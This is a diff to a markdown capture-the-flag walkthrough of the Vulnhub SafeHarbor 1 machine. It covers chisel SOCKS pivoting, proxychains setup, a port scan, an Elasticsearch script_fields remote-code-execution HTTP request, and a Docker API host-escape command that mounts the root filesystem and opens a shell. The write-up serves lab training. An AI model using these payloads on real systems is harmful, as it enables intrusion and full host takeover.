@@ -313,7 +313,7 @@ Outside   |                                                 reverse connect to 8
 **On the (Kali) attacker machine run**
 
 ```sh
-/chisel_linux_amd64 server -p 8888 -reverse 
+./chisel_linux_amd64 server -p 8888 -reverse 
 ```
 
 ![chisel_listening_server](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_3.gif)
@@ -370,6 +370,7 @@ tcp        0      0 127.0.0.1:14000         0.0.0.0:*               LISTEN      
 
 Port 14000 has opened up on my Kali machine, let me add it to the proxychains configuration file to use that as my socks5 proxy. If this works, I should be able to use proxychains to continue moving laterally.
 
+
 ```
 root@kali:~# tail /etc/proxychains.conf
 #
@@ -381,12 +382,88 @@ root@kali:~# tail /etc/proxychains.conf
 # meanwile
 # defaults set to "tor"
 socks5 127.0.0.1 14000
+localnet 127.0.0.1 000 255.255.255.255
 ```
 Quickly testing the socks5 proxy connectivity, let's do a curl on the target web server and a quick full TCP scan for port 80 on limited hosts.
 
 ![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.gif)
 
+Let's go ahead and run a full TCP port scan on using Metasploit with proxychains:
 
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_8.png)
+
+```
+Services
+========
+
+host          port  proto  name  state  info
+----          ----  -----  ----  -----  ----
+172.20.0.1    22    tcp          open   
+172.20.0.1    80    tcp          open   
+172.20.0.2    80    tcp          open   
+172.20.0.4    80    tcp          open   
+172.20.0.5    80    tcp          open   
+172.20.0.6    80    tcp          open   
+172.20.0.8    80    tcp          open   
+172.20.0.138  3306  tcp          open  
+```
+
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_9.png)
+
+https://www.exploit-db.com/exploits/36337
+
+```
+POST http://172.20.0.124:9200/_search?pretty HTTP/1.1
+Host: 172.20.0.124:9200
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 140
+
+{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
+```
+
+Alright, now that I know how the command injection works I'll go ahead and use the python exploit to upload a meterpreter binary.
+
+
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_10.png)
+
+Gathered some info:
+
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_11.png)
+
+Let's see what's in there:
+
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_12.png)
+
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_13.png)
+
+
+
+Using socks4a:
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_16.png)
+
+
+
+Do port forwarding:
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_17.png)
+
+https://www.exploit-db.com/exploits/42356
+
+```
+docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
+```
+
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_18.png)
+
+Flag:
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_19.png)
+
+Bonus Flag:
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_20.png)
 
 **References:**
 
